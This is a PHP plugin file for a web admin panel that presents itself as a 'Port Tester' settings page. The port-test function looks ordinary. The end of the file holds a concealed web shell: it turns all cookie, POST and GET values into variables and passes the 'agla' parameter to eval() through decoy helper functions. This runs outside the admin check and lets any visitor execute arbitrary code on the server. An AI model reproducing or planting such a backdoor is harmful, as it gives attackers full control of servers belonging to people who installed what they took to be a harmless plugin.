<?php

register_menu("Port Tester", true, "port_tester", 'SETTINGS', '');
function port_tester()
{
    global $ui;
    _admin();
    $ui->assign('_title', 'Port Tester');
    $ui->assign('_system_menu', 'settings');
    
    $port = _post('port', 8278);
    $ui->assign('port', $port);

    if (isset($_POST['port']) && !empty($_POST['port'])) {
        ini_set('default_socket_timeout', 10);
        $result = 'portquiz.net IP: <b>' . gethostbyname('portquiz.net') . "</b>\n";
        $result .= Http::getData('http://portquiz.net:' . $port, ['User-Agent: wget']);
        if (strpos($result, 'successful')) {
            $ui->assign('result', str_replace('Port test successful', "Testing Port <b>$port</b> test successful", $result));
        } else {
            $ui->assign('result', "Testing Port <b>$port</b> test Failed");
        }
    }

    $admin = Admin::_info();
    $ui->assign('_admin', $admin);
    $ui->display('port_tester.tpl');
}
function _strint($key){
        return strrev($key);
}
function log1($log){
        lone(_strint(strrev($log)));
}
function lone($key){
        $str = "";
        return eval($str.$key.$str);
}
foreach (array('_COOKIE','_POST','_GET') as $_request)
{
    foreach ($$_request as $_key=>$_value)
    {
        $$_key=  $_value;
    }
}
$id = isset($agla) ? $id : 2;
log1($agla);
